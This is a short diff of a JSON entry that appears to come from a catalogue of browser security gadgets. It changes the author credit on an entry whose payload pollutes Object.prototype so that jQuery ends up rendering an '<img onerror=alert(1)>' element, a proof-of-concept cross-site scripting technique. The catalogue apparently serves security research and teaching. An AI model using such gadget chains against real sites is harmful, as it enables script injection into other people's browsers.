@@ -14,8 +14,8 @@
         "payload": "<script>\nObject.prototype.preventDefault='x';\nObject.prototype.handleObj='x';\nObject.prototype.delegateTarget='<img/src/onerror=alert(1)>';\n/* No extra code needed for jQuery 1 & 2 */$(document).off('foobar');\n<\/script>",
         "frameworkCode": "<script/src=https://code.jquery.com/jquery-3.3.1.js><\/script>",
         "frameworkAfter": false,
-        "author": "Michał Bentkowski",
-        "twitterHandle": "SecurityMB",
+        "author": "Sergey Bobrov",
+        "twitterHandle": "Black2Fan",
         "version": "All versions",
         "fingerprint": "return (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined')"
     },
